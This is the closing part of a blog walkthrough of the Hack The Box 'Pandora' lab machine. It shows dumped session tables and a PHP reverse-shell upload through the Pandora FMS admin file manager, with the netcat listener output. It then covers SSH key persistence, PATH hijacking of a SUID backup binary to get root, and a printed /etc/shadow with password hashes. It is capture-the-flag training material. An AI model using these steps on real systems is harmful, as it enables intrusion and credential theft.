class="line"><span class="string">| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;;                             | 1638881664  |</span></span><br><span class="line"><span class="string">| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | 1638787213  |</span></span><br><span class="line"><span class="string">| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | 1638786277  |</span></span><br><span class="line"><span class="string">| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;;                             | 1641200284  |</span></span><br><span class="line"><span class="string">| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | 1638786504  |</span></span><br><span class="line"><span class="string">| fj5973s4hsdkl25lskua24hbsa | NULL                                                 | 1641958908  |</span></span><br><span class="line"><span class="string">| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | 1638786762  |</span></span><br><span class="line"><span class="string">| fvt8eacn87b0um261o6itg0fns | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1641959362  |</span></span><br><span class="line"><span class="string">| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;;                             | 1638783230  |</span></span><br><span class="line"><span class="string">| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0;  | 1638796349  |</span></span><br><span class="line"><span class="string">| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | 1638786349  |</span></span><br><span class="line"><span class="string">| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 | 1638540345  |</span></span><br><span class="line"><span class="string">| hf67p6grm46nvkc89t9jfu8pvo | id_usuario|s:6:&quot;daniel&quot;;                             | 1641959232  |</span></span><br><span class="line"><span class="string">| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;;                             | 1638168492  |</span></span><br><span class="line"><span class="string">| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;;                             | 1638456173  |</span></span><br><span class="line"><span class="string">| k4gk31co9jovifc0h7dpdjjhmd | NULL                                                 | 1641959269  |</span></span><br><span class="line"><span class="string">| kp90bu1mlclbaenaljem590ik3 | NULL                                                 | 1638787808  |</span></span><br><span class="line"><span class="string">| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 | 1638796348  |</span></span><br><span class="line"><span class="string">| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638540482  |</span></span><br><span class="line"><span class="string">| ogmrr1pttk20cm1rjjv5buu6s4 | NULL                                                 | 1641959258  |</span></span><br><span class="line"><span class="string">| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;;                             | 1637667827  |</span></span><br><span class="line"><span class="string">| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:&quot;daniel&quot;;                             | 1638168416  |</span></span><br><span class="line"><span class="string">| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                 | 1638787723  |</span></span><br><span class="line"><span class="string">| r097jr6k9s7k166vkvaj17na1u | NULL                                                 | 1638787677  |</span></span><br><span class="line"><span class="string">| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:&quot;daniel&quot;;                             | 1638889082  |</span></span><br><span class="line"><span class="string">| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638547193  |</span></span><br><span class="line"><span class="string">| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:&quot;daniel&quot;;                             | 1638793297  |</span></span><br><span class="line"><span class="string">+----------------------------+------------------------------------------------------+-------------+</span></span><br><span class="line"><span class="string">......</span></span><br></pre></td></tr></table></figure>
+
+<p>After logging in as admin, we snoop around a bit and see that there is a file upload options. It also seems like the system is written in php. So lets use the good old php-reverse-shell.</p>
+<p>go to admin tools -&gt; file manager</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2126.jpg"></li>
+</ul>
+<p>We upload the shell and set a listener at 9000 on our machine and navigate to the shell in our browser.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/pandora_console/images/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+
+<p>Voila! We get a reverse shell with the user matt and we get user.txt. Great!!!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># nc -lvp 1234                                         </span></span><br><span class="line">listening on [any] 1234 ...</span><br><span class="line">10.10.11.136: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.14.3] from (UNKNOWN) [10.10.11.136] 49270</span><br><span class="line">Linux pandora 5.4.0-91-generic <span class="comment">#102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> 13:23:38 up 14 min,  1 user,  load average: 0.00, 0.03, 0.08</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">daniel   pts/0    10.10.14.3       13:09   13:52   0.05s  0.05s -bash</span><br><span class="line">uid=1000(matt) gid=1000(matt) <span class="built_in">groups</span>=1000(matt)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=1000(matt) gid=1000(matt) groups=1000(matt)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">matt</span></span><br><span class="line"><span class="string">$ python -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">/bin/sh: 3: python: not found</span></span><br><span class="line"><span class="string">$ python3 -c &#x27;</span>import pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string">matt@pandora:/$</span></span><br><span class="line"><span class="string">matt@pandora:/home/matt$ cat user.txt</span></span><br><span class="line"><span class="string">48d4ff3d5d47803c2e69216fb3a7cee9</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2129.jpg"></li>
+</ul>
+<p>write a ssh key in matt user’s home dir</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/pandora]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa matt@10.10.11.136                               </span></span><br><span class="line">Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">  System information as of Wed 12 Jan 14:40:31 UTC 2022</span><br><span class="line"></span><br><span class="line">  System load:  0.14              Processes:             262</span><br><span class="line">  Usage of /:   63.0% of 4.87GB   Users logged <span class="keyword">in</span>:       2</span><br><span class="line">  Memory usage: 8%                IPv4 address <span class="keyword">for</span> eth0: 10.10.11.136</span><br><span class="line">  Swap usage:   0%</span><br><span class="line"></span><br><span class="line">  =&gt; /boot is using 91.8% of 219MB</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0 updates can be applied immediately.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">The list of available updates is more than a week old.</span><br><span class="line">To check <span class="keyword">for</span> new updates run: sudo apt update</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Wed Jan 12 14:39:39 2022 from 10.10.17.32</span><br><span class="line">matt@pandora:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(matt) gid=1000(matt) <span class="built_in">groups</span>=1000(matt)</span><br><span class="line">matt@pandora:~$ <span class="built_in">whoami</span></span><br><span class="line">matt</span><br></pre></td></tr></table></figure>
+
+<p>After logging in, the first thing we do is obtain linpeas.sh onto the target system. Running linpeas gives some juicy info, but the most eye catching thing is a binary called pandora_backup with the SUID set.</p>
+<p>Looking at the contents of the binary, we see that it is using tar to uncompress something from &#x2F;root. Since tar is not being called with the absolute path, we can use PATH highjacking to obtain root.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2127.jpg"></li>
+</ul>
+<p>We create a local file tar, with contents “&#x2F;bin&#x2F;sh”, append the path to our PATH env variable and run the binary and we get root and out last flag inside &#x2F;root</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">matt@pandora:~$ <span class="built_in">echo</span> <span class="string">&quot;/bin/sh&quot;</span> &gt; tar</span><br><span class="line">matt@pandora:~$ <span class="built_in">chmod</span> +x tar</span><br><span class="line">matt@pandora:~$ <span class="built_in">export</span> PATH=$(<span class="built_in">pwd</span>):<span class="variable">$PATH</span></span><br><span class="line">matt@pandora:~$ /usr/bin/pandora_backup</span><br><span class="line">PandoraFMS Backup Utility</span><br><span class="line">Now attempting to backup PandoraFMS client</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=1000(matt) <span class="built_in">groups</span>=1000(matt)</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="comment"># cat /root/root.txt</span></span><br><span class="line">956517a857308a1537fd51418aa48805</span><br><span class="line"><span class="comment"># cat /etc/shadow</span></span><br><span class="line">root:$6$HM2preufywiCDqbY<span class="variable">$XPrZFWf6w08MKkjghhCPBkxUo2Ag5xvZYOh4iD4XcN4zOVbWsdvqLYbznbUlLFxtC</span>/.Z0oe9D6dT0cR7suhfr.:18794:0:99999:7:::</span><br><span class="line">daemon:*:18659:0:99999:7:::</span><br><span class="line">bin:*:18659:0:99999:7:::</span><br><span class="line">sys:*:18659:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">games:*:18659:0:99999:7:::</span><br><span class="line">man:*:18659:0:99999:7:::</span><br><span class="line">lp:*:18659:0:99999:7:::</span><br><span class="line">mail:*:18659:0:99999:7:::</span><br><span class="line">news:*:18659:0:99999:7:::</span><br><span class="line">uucp:*:18659:0:99999:7:::</span><br><span class="line">proxy:*:18659:0:99999:7:::</span><br><span class="line">www-data:*:18659:0:99999:7:::</span><br><span class="line">backup:*:18659:0:99999:7:::</span><br><span class="line">list:*:18659:0:99999:7:::</span><br><span class="line">irc:*:18659:0:99999:7:::</span><br><span class="line">gnats:*:18659:0:99999:7:::</span><br><span class="line">nobody:*:18659:0:99999:7:::</span><br><span class="line">systemd-network:*:18659:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">messagebus:*:18659:0:99999:7:::</span><br><span class="line">syslog:*:18659:0:99999:7:::</span><br><span class="line">_apt:*:18659:0:99999:7:::</span><br><span class="line">tss:*:18659:0:99999:7:::</span><br><span class="line">uuidd:*:18659:0:99999:7:::</span><br><span class="line">tcpdump:*:18659:0:99999:7:::</span><br><span class="line">landscape:*:18659:0:99999:7:::</span><br><span class="line">pollinate:*:18659:0:99999:7:::</span><br><span class="line">usbmux:*:18789:0:99999:7:::</span><br><span class="line">sshd:*:18789:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18789::::::</span><br><span class="line">matt:$6$JYpB9KogYA60PG6X<span class="variable">$dU7jHpb3MIYYg0evztbE8Xw8dx7ok5</span>/U0PaDT63FgQTwyJFr9DbaLa0WzeZGMFd05hrNCnoP5xTUr7Mkl2gNx1:18794:0:99999:7:::</span><br><span class="line">lxd:!:18789::::::</span><br><span class="line">Debian-snmp:!:18789:0:99999:7:::</span><br><span class="line">mysql:!:18789:0:99999:7:::</span><br><span class="line">daniel:$6<span class="variable">$f4POti4xJyVf3</span>/yD<span class="variable">$7</span>/efpNYDq.baYycVczUb4b5LlEBNami3//4TbI6lPNK2MaWPrqbdvAhLdMrfHnnZATY59rLgr4DeEZ3U8S41l/:18964:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2128.jpg"></li>
+</ul>
+<h1 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h1><ul>
+<li>snmpwalk enum to get daniel’s ssh password</li>
+<li>ssh port forwarding</li>
+<li>Pandora FMS 742 sql injection(CVE-2021-32099)</li>
+<li>file upload php-reverse-shell.php to get rev shell</li>
+<li>PATH highjacking to obtain root</li>
+</ul>
+<h1 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h1><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2022/01/12/pandora/" title="Hack-The-Box-walkthrough[pandora]">https://fdlucifer.github.io/2022/01/12/pandora/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/01/08/search/" rel="prev" title="Hack-The-Box-walkthrough[search]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[search]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/01/17/mimic-ssrf/" rel="next" title="拟态web---mimic-ssrf">
+                  拟态web---mimic-ssrf <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
